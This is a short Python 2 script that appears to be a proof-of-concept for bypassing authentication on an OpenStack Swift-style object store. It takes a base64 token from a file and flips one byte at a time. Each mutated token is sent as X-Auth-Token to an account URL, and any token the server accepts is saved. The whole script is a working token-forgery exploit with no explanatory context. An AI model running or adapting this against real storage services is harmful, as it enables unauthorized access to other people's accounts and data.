#!/usr/bin/env python 

import urllib2
import base64 

#handler=urllib2.HTTPHandler(debuglevel=1)
#opener = urllib2.build_opener(handler)
#urllib2.install_opener(opener) 

print 'hello' 

token_orig = open('token.txt','r').read().strip(' ')
token_orig = token_orig.replace('-','/')
print 'token_orig'
#print token_orig 

token_bin = base64.b64decode(token_orig) 

total = len(token_bin) 

fout = open('found_tokens.txt','w')
print 'foput' 

for i in range(len(token_bin)):
      token_mutated = token_bin[:i] + chr((ord(token_bin[i])-1)%256) + token_bin[i+1:]        #Actually, we can replace the token_bin[1] to any char
      token = base64.b64encode(token_mutated)
      #print token
      url = "http://object-store.localdomain.com:8006//v1/AUTH_dd9fe02191dc4a898263bdfe05994832?format=json"
      req = urllib2.Request(url) 

       req.add_header('Accept','*/*')
      req.add_header('X-Auth-Token',token)
      try:
              resp = urllib2.urlopen(req)
              print i,total,resp.getcode(),resp.read()
              fout.write(str(i) +'\n\n' + token+'\n\n\n')
              print 'write file'
              fout.flush()
      except urllib2.HTTPError, err:
              #print i,total,err.code
              continue 
